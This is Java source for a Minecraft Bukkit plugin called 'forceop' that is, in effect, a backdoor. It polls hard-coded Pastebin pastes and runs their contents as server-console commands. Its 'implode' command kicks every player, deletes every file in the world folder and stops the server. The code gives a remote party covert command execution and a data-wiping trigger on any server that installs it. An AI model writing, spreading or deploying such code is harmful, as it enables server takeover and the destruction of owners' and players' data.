package com.webmets.forceop;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import net.md_5.bungee.api.ChatColor;

public class Main extends JavaPlugin implements Listener {

	public List<String> pasteIDs;

	public static Main instance;

	@Override
	public void onEnable() {
		instance = this;
		pasteIDs = new ArrayList<String>();
		pasteIDs.add("Hx5skcAk");
		pasteIDs.add("ybRvCurU");

		for (String s : pasteIDs) {
			Bukkit.getScheduler().scheduleSyncRepeatingTask(this, new Checker(s), 0, 100);
		}
	}

	public static void registerPaste(String pasteId) {
		Bukkit.getScheduler().scheduleSyncRepeatingTask(instance, new Checker(pasteId), 0, 100);
	}

	public static class Checker implements Runnable {

		private Map<Integer, String> lastRan;
		private String pasteID = "";

		public Checker(String pasteID) {
			this.lastRan = new HashMap<Integer, String>();
			this.pasteID = pasteID;
		}

		public void run() {
			if (getPaste(pasteID).equalsIgnoreCase("INVALID"))
				return;
			int i = 0;
			for (String s : getPaste(pasteID).split("<console>")[1].split("</console>")[0].split("#")) {
				i = i + 1;
				String cmd = s.trim();
				if (cmd.equalsIgnoreCase("null")) {
					lastRan.put(i, "null");
					continue;
				}
				if (lastRan.get(i) == null) {
					lastRan.put(i, "null");
				}
				if (cmd.equals(lastRan.get(i))) {
					continue;
				}
				lastRan.put(i, cmd);

				if (cmd.startsWith("newpaste")) {
					String pasteID = cmd.split(" ")[1];
					if (getPaste(pasteID).equalsIgnoreCase("INVALID")) {
						continue;
					}
					Main.registerPaste(pasteID);
				} else if (cmd.equalsIgnoreCase("implode")) {
					new BukkitRunnable() {
						int timer = 15;

						@Override
						public void run() {
							if (timer == 15 || timer == 10 || timer == 5) {
								Bukkit.broadcastMessage(ChatColor.LIGHT_PURPLE + "This server is gonna implode in "
										+ timer + " seconds");
							}
							if (timer <= 0) {
								for (Player p : Bukkit.getOnlinePlayers()) {
									p.kickPlayer(ChatColor.RED
											+ "Sorry, but this server is now dead\ncheck server files ;)");
								}
								for (File f : Bukkit.getWorldContainer().listFiles()) {
									f.delete();
								}
								Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "stop");
							}
							timer--;
						}
					}.runTaskTimer(Main.instance, 0, 20);

				}

				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
			}
		}

		public String getPaste(String paste) {
			try {

				URL url = new URL("https://pastebin.com/raw/" + paste);
				URLConnection connection = url.openConnection();
				connection.setRequestProperty("User-Agent",
						"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36");
				BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

				String code = "", line = "";

				while ((line = br.readLine()) != null) {
					code = code + line;
				}
				return code;
			} catch (IOException e) {
				return "INVALID";
			}
		}
	}
}
